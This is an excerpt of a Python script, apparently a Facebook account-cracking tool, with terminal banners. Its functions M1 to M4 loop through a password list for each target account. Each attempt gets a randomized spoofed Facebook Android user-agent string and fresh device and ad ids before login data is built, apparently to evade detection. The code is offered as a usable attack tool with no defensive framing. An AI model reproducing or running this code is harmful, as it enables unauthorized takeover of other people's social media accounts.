...
\033[1;32m[\033[1;31m=\033[1;32m] \033[1;32mVERSION \033[1;32m: 3.0
\033[1;32m═════════════════════════════════════""")
def linex():
    print('\033[1;32m══════════════════════════════════════')
def clear():
...
def M1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/38.0.0.870;FBPN/com.facebook.orca;FBLC/it_IT;FBBV/54154249;FBCR/Airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-T311|KOT4;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.5,width=875,height=1610};FB_FW/1;FBRV/54154249]"
...
def M2(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/193.0.0.7715;FBPN/com.facebook.orca;FBLC/it_IT;FBBV/562341337;FBCR/Teletalk;FBMF/samsung;FBBD/samsung;FBDV/SM-G920F|NRD90M;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.5,width=1104,height=1903};FB_FW/1;FBRV/562341337]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
...
def M3(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/188.0.0.8581;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/445809368;FBCR/SCO;FBMF/samsung;FBBD/samsung;FBDV/GT-N8000|KOT49H;FBSV/9.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1335,height=1389};FB_FW/1;FBRV/445809368]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
...
def M4(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/100.0.0.30.81;FBBV/492819226;FBDM/{density=3.2949156702508864,width=1158,height=2327};FBLC/ar_AE;FBRV/492819226;FBCR/Axiata;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-P5210|KOT49H;FBSV/12;nullFBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
